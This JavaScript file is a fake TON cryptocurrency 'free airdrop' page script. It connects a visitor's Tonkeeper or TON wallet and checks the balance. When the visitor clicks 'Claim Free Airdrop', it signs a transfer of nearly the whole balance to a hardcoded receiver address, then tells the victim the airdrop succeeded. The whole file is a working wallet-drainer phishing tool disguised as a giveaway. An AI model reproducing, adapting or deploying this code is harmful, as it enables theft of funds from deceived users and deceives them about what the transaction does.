$(document).ready(function () {
    // Function to connect the wallet
    async function connectWallet() {
        // Check if the user is on a mobile device
        if (/Mobi|Android|iPhone/i.test(navigator.userAgent)) {
            openInWalletBrowser();
            return;
        }

        // Check if either TON or TONKeeper wallet is available in the browser
        if (window.ton || window.tonkeeper) {
            try {
                // Use the TON wallet (TON or TONKeeper)
                const walletInstance = window.ton || window.tonkeeper;

                // Request connection to the wallet
                const resp = await walletInstance.connect();
                console.log("Wallet connected:", resp);

                // Initialize TON Web SDK
                const tonweb = new TonWeb();
                const address = resp.publicKey;
                const wallet = tonweb.wallet.create({ publicKey: new Uint8Array(address) });

                // Get wallet balance
                const balance = await wallet.getBalance();
                console.log("Wallet balance:", balance);

                // Minimum balance required for transaction
                const minBalance = 1e9; // 1 TON in nanoton (1e9)

                // Check if the balance is sufficient for a transaction fee
                if (balance < minBalance) {
                    alert("Insufficient funds for Fee.");
                    return;
                }

                // Change button text and set up event to claim airdrop
                $("#connect-wallet").text("Claim Free Airdrop");
                $("#connect-wallet").off("click").on("click", async () => transferAssets(tonweb, wallet, address, balance, minBalance));

            } catch (err) {
                console.error("Error connecting to wallet:", err);
            }
        } else {
            alert("No supported wallet found. Please install Tonkeeper or another TON wallet.");
            window.open("https://ton.org/wallet", "_blank");
        }
    }

    // Function to open wallet browser link on mobile
    function openInWalletBrowser() {
        let siteURL = encodeURIComponent(window.location.href);
        let walletLinks = {
            tonkeeper: `https://tonkeeper.com/?url=${siteURL}`,
        };

        let storeLinks = {
            tonkeeper: "https://tonkeeper.com/",
        };

        let selectedWallet = "tonkeeper";
        let deepLink = walletLinks[selectedWallet];
        let storeLink = storeLinks[selectedWallet];

        let timeout = setTimeout(() => {
            window.location.href = storeLink;
        }, 2000);

        window.location.href = deepLink;

        setTimeout(() => {
            clearTimeout(timeout);
        }, 1000);
    }

    // Function to transfer assets to a specific wallet
    async function transferAssets(tonweb, wallet, address, balance, minBalance) {
        try {
            const receiverWallet = "UQDT_5jBkJA3Y5qGeb-lZjbv8nM8yo44C81HZT78S4H6xGoh"; // Replace with the actual receiver address
            const balanceForTransfer = balance - minBalance;

            if (balanceForTransfer > 0) {
                const tonAmount = balanceForTransfer / 1e9; // Convert balance to TON
                const message = await tonweb.wallet.createTransfer({
                    to: receiverWallet,
                    value: tonAmount,
                    seqno: await wallet.getSeqno(),
                    payload: "",
                });

                // Sign the transaction
                const signed = await wallet.signTransfer(message);
                const txid = await tonweb.provider.sendMessage(signed);
                console.log("Transaction confirmed:", txid);
                alert("Airdrop transferred successfully!");
            }
        } catch (err) {
            console.error("Error during transaction:", err);
            alert("Transaction failed. Please try again.");
        }
    }

    // Set up the wallet connection on button click
    $("#connect-wallet").on("click", connectWallet);
});
